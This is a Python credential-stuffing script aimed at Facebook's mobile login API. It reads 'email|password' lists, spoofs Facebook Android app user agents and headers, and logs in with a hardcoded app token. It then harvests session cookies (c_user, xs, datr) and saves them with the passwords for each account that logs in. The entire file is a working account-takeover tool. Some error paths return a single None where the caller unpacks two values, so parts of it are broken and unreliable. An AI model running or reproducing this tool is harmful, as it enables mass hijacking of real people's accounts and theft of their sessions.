import requests
import random

GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"

url = "https://graph.facebook.com/auth/login"

def useragent():
    fbks = ('com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite')
    enCRACK1 = ['en_GB', 'en_US']
    CRACKsim1 = ['Banglalink', 'Grameenphone', 'Robi', 'Airtel', 'Teletalk']
    modelxxx = [
        "2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I",
        "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC",
        "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC",
        "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG", "M2101K9R", "2109119DG", "M2101K9G",
        "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C",
        "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", 
        "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C",
        "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG",
        "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", 
        "22021211RC"
    ]
    gtt = random.choice(modelxxx)
    android_version = str(random.randint(6, 13))
    fbav = f"{random.randint(111, 111)}.{random.randint(111, 999)}.{random.randint(111, 999)}.{random.randint(111, 999)}"
    fbbv = str(random.randint(111111111, 999999999))
    lc = random.choice(enCRACK1)
    cr = random.choice(CRACKsim1)
    
    CRACK_ua = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM={{density=3.0,width=1280,height=1440}};FBLC/{lc};FBRV/0;FBCR/{cr};FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/{gtt};FBSV/{android_version};FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    return CRACK_ua

def inc3_cookies(email, pwd):
    ugen = useragent()  # Use a dynamic User-Agent
    data = {
        "format": "json",
        "cpl": "true",
        "credentials_type": "device_based_login_password",
        "error_detail_type": "button_with_disabled",
        "source": "device_based_login",
        "email": email,
        "password": pwd,
        "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
        "generate_session_cookies": "1",
        "meta_inf_fbmeta": "",
        "currently_logged_in_userid": "0",
        "locale": "en_US",
        "client_country_code": "US",
        "method": "auth.login",
        "fb_api_req_friendly_name": "authenticate",
        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
        "api_key": "882a8490361da98702bf97a021ddc14d",
    }

    headers = {
        'User-Agent': ugen,
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': 'graph.facebook.com',
        'X-FB-Connection-Type': 'MOBILE.LTE',
        'X-Tigon-Is-Retry': 'False',
        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
        'x-fb-device-group': '5120',
        'X-FB-Friendly-Name': 'ViewerReactionsMutation',
        'X-FB-Request-Analytics-Tags': 'graphservice',
        'X-FB-HTTP-Engine': 'Liger',
        'X-FB-Client-IP': 'True',
        'X-FB-Server-Cluster': 'True',
        'x-fb-connection-token': 'd29d67d37eca387482a8d7e786e38746f047a0cbebb64d5ecc412f5e0f1cb5'
    }

    req = requests.Session()
    response = req.post(url, data=data, headers=headers)

    # Ensure response is valid JSON
    try:
        response_json = response.json()
    except ValueError:
        return None

    if "session_cookies" in response_json:
        cookies = {cookie['name']: cookie['value'] for cookie in response_json['session_cookies']}
        uid = cookies.get('c_user', '')  # Save c_user value as uid
        if not uid:
            return None

        # Extract specific cookies
        datr = cookies.get('datr', '')
        sb = cookies.get('sb', '')
        xs = cookies.get('xs', '')
        fr = cookies.get('fr', '')

        # Create the cookie string in the specified format
        cookie = f"datr={datr}; sb={sb}; c_user={uid}; xs={xs}; fr={fr}; m_page_voice={uid}"

        # Handle checkpoint detection
        if 'checkpoint' in cookie:
            return None
        return uid, cookie  # Return uid and cookie
    return None, None

if __name__ == "__main__":
    input_file = input("Enter the input file path: ")
    output_file = input("Enter the output file path: ")

    with open(input_file, "r") as infile, open(output_file, "a") as outfile:
        for line in infile:
            line = line.strip()
            if not line:
                continue

            parts = line.split("|")
            if len(parts) < 2:
                continue
            email = parts[0]
            password = parts[1]

            uid, cookies = inc3_cookies(email, password)
            if cookies:
                outfile.write(f"{uid}|{password}|{cookies}|{email}\n")  # Save uid|pass|cookies|email
                print(f"{GREEN}{uid}|{password}|{cookies}|{email}{RESET}")
            else:
                outfile.write(f"{email}|{password}|login_failed\n")
                print(f"{RED}{email}|{password}|login_failed{RESET}")

    print("Process completed.")
